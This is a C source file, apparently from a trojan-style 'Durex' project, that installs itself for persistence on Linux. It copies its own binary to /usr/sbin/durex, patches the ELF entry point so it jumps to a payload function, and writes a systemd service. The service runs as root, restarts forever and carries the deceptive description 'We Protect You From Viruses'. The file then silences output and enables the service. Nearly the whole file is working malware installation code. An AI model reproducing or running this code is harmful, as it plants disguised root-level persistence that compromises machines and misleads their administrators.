#include "durex.h"

#define DUREX_PATH		"/usr/sbin/durex"
#define DUREX_SERVICE_PATH	"/etc/systemd/system/durex.service"
#define DUREX_SERVICE_CONTENT	""                                           \
				"[Unit]\n"                                   \
				"Description=We Protect You From Viruses\n"  \
				"\n"                                         \
				"[Service]\n"                                \
				"Type=simple\n"                              \
				"ExecStart="DUREX_PATH"\n"                   \
				"Restart=always\n"                           \
				"RestartSec=1\n"                             \
				"PIDFile=/tmp/durex.pid\n"                   \
				"User=root\n"                                \
				"\n"                                         \
				"[Install]\n"                                \
				"WantedBy=multi-user.target\n"               \
				"Alias=durex.service\n"

void		payload(void);
void		_start(void);

/* -------------------------------------------------------------------------- */

static uint8_t	*read_program(const char *program_path, size_t *size)
{
	int	fd = open(program_path, O_RDONLY);
	if (fd == -1)
	{
		silent_error("failed to open input program file");
		return NULL;
	}
	struct stat	statbuf;
	if (fstat(fd, &statbuf) == -1)
	{
		close(fd);
		silent_error("failed to stat input program file");
		return NULL;
	}
	uint8_t	*content = malloc(statbuf.st_size);
	if (content == NULL)
	{
		close(fd);
		silent_error("failed to malloc for input program");
		return NULL;
	}
	ssize_t	ret = read(fd, content, statbuf.st_size);
	close(fd);
	if (ret == -1)
	{
		free(content);
		silent_error("failed to read input program");
		return NULL;
	}

	silent_log("read %zu bytes of input program.\n", statbuf.st_size);
	*size = statbuf.st_size;
	return content;
}

static int	change_entrypoint(Elf64_Ehdr *elf64_hdr, size_t size)
{
	if (size < sizeof(Elf64_Ehdr))
		return silent_error("invalid file size");

	size_t	delta_main_payload = (size_t)payload - (size_t)_start;

	elf64_hdr->e_entry += delta_main_payload;
	silent_log("delta is %#lx. new entry point set at %#llx.\n", delta_main_payload, elf64_hdr->e_entry);

	return 0;
}

static int	write_program(uint8_t *content, size_t size)
{
	int	fd = open(DUREX_PATH, O_WRONLY | O_CREAT, 0700);
	if (fd == -1)
		return silent_error("failed to open output program file");

	ssize_t	ret = write(fd, content, size);
	close(fd);
	if (ret == -1)
		return silent_error("failed to write to output program file");

	silent_log("written %zu bytes in output program.\n", ret);

	return 0;
}

static int	create_bin(const char *program_path)
{
	size_t	size     = 0;
	uint8_t	*content = read_program(program_path, &size);

	if (content == NULL
	|| (change_entrypoint((Elf64_Ehdr*)content, size) == -1)
	|| (write_program(content, size) == -1))
	{
		free(content);
		return silent_error("failed to output program");
	}

	free(content);
	return 0;
}

static void	configure_service(const char *program_path)
{
	if (create_bin(program_path) == -1)
		silent_fatal("failed to copy durex to "DUREX_PATH);

	if (dump_to_file(DUREX_SERVICE_PATH, DUREX_SERVICE_CONTENT) == -1)
	{
		silent_fatal("failed to dump systemd config to "DUREX_SERVICE_PATH);
		return ;
	}

	int	fd = open("/dev/null", O_WRONLY);
	if (fd == -1)
		silent_fatal("failed to open /dev/null");

	if (dup2(fd, 1) == -1 || dup2(fd, 2) == -1)
		silent_fatal("failed to duplicate file descriptors");

	system("systemctl enable durex");
	system("systemctl start durex");
	close(fd);
}

void		setup_payload(const char *program_path)
{
	struct stat	statbuf;

	// skip if service file already exists
	if (stat(DUREX_SERVICE_PATH, &statbuf) == 0)
		goto end;

	silent_log("configuring service...\n");
	configure_service(program_path);
end:
	exit(EXIT_SUCCESS);
}
